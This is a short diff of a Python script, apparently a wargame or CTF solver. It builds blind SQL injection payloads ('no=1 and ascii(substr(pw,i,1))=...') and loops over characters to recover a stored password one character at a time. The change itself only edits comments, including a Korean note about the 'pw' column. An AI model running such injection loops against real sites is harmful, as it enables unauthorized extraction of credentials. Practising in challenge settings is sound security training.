@@ -6,8 +6,9 @@ params = {'PHPSESSID' : 'my_session'}
 chr_list = string.ascii_lowercase + '1234567890' + '!@#$%^&*()_+=-{}[]'
 password = ''
 
-#no=1
-for i in range (1,6) :
+#db_pw컬럼명이 pw이고, 길이가 정해져있을때 
+#no=1 
+for i in range (1,6) : 
     for j in chr_list :
         sql_query = 'no=1 and ascii(substr(pw,'+str(i)+',1))='+str(hex(ord(j)))
         pay_load = url + sql_query
